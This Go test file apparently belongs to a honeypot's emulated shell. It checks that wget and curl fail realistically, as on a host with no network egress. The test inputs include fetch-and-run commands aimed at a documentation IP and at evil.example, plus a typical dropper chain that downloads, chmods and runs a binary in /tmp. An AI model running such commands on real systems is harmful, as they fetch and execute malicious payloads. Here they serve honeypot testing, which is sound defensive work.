package shell

import (
	"regexp"
	"strings"
	"testing"
)

var wgetStamp = regexp.MustCompile(`^--\d{4}-\d\d-\d\d \d\d:\d\d:\d\d--  `)

func TestWgetFailsLikeAHostWithNoEgress(t *testing.T) {
	s := NewInterpreter("root")
	out, code := run(t, s, "wget http://198.51.100.7/x.sh")
	lines := strings.Split(out, "\r\n")
	if code != 4 || len(lines) != 3 || !wgetStamp.MatchString(lines[0]) ||
		!strings.HasSuffix(lines[0], "http://198.51.100.7/x.sh") ||
		lines[1] != "Connecting to 198.51.100.7:80... failed: Connection timed out." ||
		lines[2] != "Giving up." {
		t.Fatalf("ip url = %q %d", out, code)
	}

	out, code = run(t, s, "wget evil.example:8080/bins/mips")
	lines = strings.Split(out, "\r\n")
	if code != 4 || len(lines) != 3 || !strings.HasSuffix(lines[0], "http://evil.example:8080/bins/mips") ||
		lines[1] != "Resolving evil.example (evil.example)... failed: Temporary failure in name resolution." ||
		lines[2] != "wget: unable to resolve host address ‘evil.example’" {
		t.Fatalf("host url = %q %d", out, code)
	}

	if out, code := run(t, s, "wget -q -O- https://198.51.100.7/x"); out != "" || code != 4 {
		t.Errorf("quiet stdout = %q %d", out, code)
	}
	if out, code := run(t, s, "wget -qO /tmp/x http://198.51.100.7/x"); out != "" || code != 4 {
		t.Errorf("quiet = %q %d", out, code)
	}
	if _, n := s.lookup("/tmp/x"); n != nil {
		t.Error("failed download created a file")
	}
	if out, code := run(t, s, "wget"); !strings.HasPrefix(out, "wget: missing URL\r\nUsage: wget [OPTION]... [URL]...") || code != 1 {
		t.Errorf("no url = %q %d", out, code)
	}
	if out, _ := run(t, s, "wget http://198.51.100.7/x 2>/dev/null"); out != "" {
		t.Errorf("stderr not redirectable: %q", out)
	}
}

func TestCurlFailsLikeAHostWithNoEgress(t *testing.T) {
	s := NewInterpreter("root")
	cases := []struct {
		line, want string
		code       int
	}{
		{"curl http://198.51.100.7/x", "curl: (28) Failed to connect to 198.51.100.7 port 80 after 130000 ms: Connection timed out", 28},
		{"curl -O https://198.51.100.7:8443/x", "curl: (28) Failed to connect to 198.51.100.7 port 8443 after 130000 ms: Connection timed out", 28},
		{"curl -fsSL evil.example/i.sh", "curl: (6) Could not resolve host: evil.example", 6},
		{"curl -s http://evil.example/i.sh", "", 6},
		{"curl", "curl: try 'curl --help' or 'curl --manual' for more information", 2},
	}
	for _, tc := range cases {
		if out, code := run(t, s, tc.line); out != tc.want || code != tc.code {
			t.Errorf("%q = %q %d, want %q %d", tc.line, out, code, tc.want, tc.code)
		}
	}
}

func TestDownloadChainKeepsGoingAfterSemicolon(t *testing.T) {
	s := NewInterpreter("root")
	out, code := run(t, s, "cd /tmp; wget -q http://198.51.100.7/b; chmod 777 b; ./b")
	if out != "chmod: cannot access 'b': No such file or directory\r\nbash: ./b: No such file or directory" || code != 127 {
		t.Fatalf("chain = %q %d", out, code)
	}
}
